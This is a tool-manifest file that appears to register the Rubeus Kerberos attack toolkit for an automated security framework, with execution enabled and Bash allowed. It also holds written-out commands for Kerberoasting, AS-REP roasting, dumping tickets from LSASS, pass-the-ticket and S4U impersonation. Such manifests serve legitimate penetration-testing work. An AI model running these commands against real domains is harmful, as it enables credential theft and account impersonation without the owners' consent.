---
id: security-ad-rubeus
namespace: security:ad:rubeus
name: rubeus
description: Kerberos abuse toolkit for Windows for performing AS-REP roasting, Kerberoasting, pass-the-ticket, S4U attacks, and Kerberos ticket manipulation.
author: "Repository Maintainers"
version: "1.0.0"
capabilities:
  - security.ad.kerberos.bruteforce
  - security.ad.kerberos.asreproast
  - security.ad.kerberos.kerberoast
  - security.ad.kerberos.passkey
  - security.ad.kerberos.delegation
  - security.credential.kerberostickets
platforms:
  - windows
risk_level: high
trust_level: verified
execution_policy: enabled
architectures:
  - amd64
dependencies: []
related_tools:
  - impacket
  - mimikatz
  - certipy
  - kerbrute
artifacts:
  - type: security.credential.hash.kerberos
    description: Kerberos ticket hash data
    mime: text/plain
    trust_level: verified
  - type: credential.data
    description: Extracted credential material
    mime: text/plain
    trust_level: verified
workflow_edges:
  produces:
    - kerberos-tickets
    - hash-data
    - extracted-credentials
  consumes:
    - target-domain
    - credential-data
contract:
  inputs:
    - type: domain.name
      description: Target domain FQDN
    - type: credential.username
      description: Target username or user list file
    - type: credential.password
      description: Password or NTLM hash for authentication
  outputs:
    - type: security.credential.hash.kerberos
      description: Crackable Kerberos hashes
      mime: text/plain
    - type: credential.data
      description: Extracted Kerberos tickets and credentials
      mime: text/plain
  side_effects:
    - network_traffic
    - filesystem_write
  resource_cost:
    cpu: low
    memory_mb: 128
    network: low
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 128
  network: low
  disk_io: low
allowed-tools:
  - rubeus
  - Bash
  - execFile
parameters:
  - name: command
    type: string
    required: true
    description: "Rubeus command (kerberoast, asreproast, dump, etc.)"
  - name: flag-domain
    type: string
    required: false
    description: "Target domain"
    aliases:
      - /domain
  - name: flag-username
    type: string
    required: false
    description: "Username for authentication"
    aliases:
      - /username
  - name: flag-password
    type: string
    required: false
    description: "Password for authentication"
    aliases:
      - /password
  - name: flag-format
    type: string
    required: false
    description: "Output format (hashcat, john)"
    aliases:
      - /format
  - name: flag-outfile
    type: string
    required: false
    description: "Output file path"
    aliases:
      - /outfile
  - name: flag-ticket
    type: string
    required: false
    description: "Base64-encoded Kerberos ticket"
    aliases:
      - /ticket
  - name: flag-ptt
    type: boolean
    required: false
    description: "Pass-the-ticket"
    alises:
      - /ptt
execution:
  template: "Rubeus.exe {command} {flags}"
  sandbox: execFile
  timeout_seconds: 300
  shell: false
examples:
  - description: "Kerberoasting SPNs"
    command: Rubeus.exe kerberoast /domain:example.com /outfile:hashes.txt
  - description: "AS-REP roasting users without pre-authentication"
    command: Rubeus.exe asreproast /domain:example.com /format:hashcat /outfile:asrep.txt
  - description: "Dump Kerberos tickets from current session"
    command: Rubeus.exe dump /service:krbtgt
  - description: "Pass-the-ticket"
    command: Rubeus.exe asktgt /user:admin /domain:example.com /ticket:<BASE64>
  - description: "S4U2Self attack"
    command: Rubeus.exe s4u /user:svc_account /impersonateuser:admin /domain:example.com
references:
  - label: "Rubeus GitHub"
    url: "https://github.com/GhostPack/Rubeus"
  - label: "Kerberos Attacks Explained"
    url: "https://posts.specterops.io/kerberos-attacks-part-1-kerberoasting-60b1edc051c4"
phase: exploitation
techniques:
  - credential-access
  - discovery
items:
  - TGS
  - TGT
  - Password
services:
  - Kerberos
attack_types:
  - CredentialAccess
  - Discovery
install:
    - method: git
      repo_url: "https://github.com/GhostPack/Rubeus.git"
      commands:
        - "git clone https://github.com/GhostPack/Rubeus.git"
---

# Rubeus — Kerberos Abuse Toolkit

Rubeus is a C# toolset for raw Kerberos interaction and abuse, designed for offensive security operations. It provides capabilities for Kerberoasting, AS-REP roasting, pass-the-ticket, pass-the-key, S4U attacks, and ticket manipulation.

## Common Attacks

| Command | Attack |
|---------|--------|
| `kerberoast` | Extract SPN service account hashes |
| `asreproast` | Find users without pre-authentication |
| `dump` | Extract tickets from LSASS |
| `asktgt` | Request TGT with specific options |
| `s4u` | S4U2Self/S4U2Proxy delegation attacks |
| `renew` | Renew existing tickets |
| `describe` | Decode and inspect ticket contents |

## Usage

```batch
:: Kerberoasting
Rubeus.exe kerberoast /domain:example.local /outfile:kerb-hashes.txt

:: AS-REP roasting
Rubeus.exe asreproast /format:hashcat /outfile:asrep-hashes.txt

:: Dump tickets
Rubeus.exe dump /luid:0x123456

:: Pass the ticket (ask TGT)
Rubeus.exe asktgt /user:admin /domain:example.local /aes256:<AES256_HASH> /ptt
```
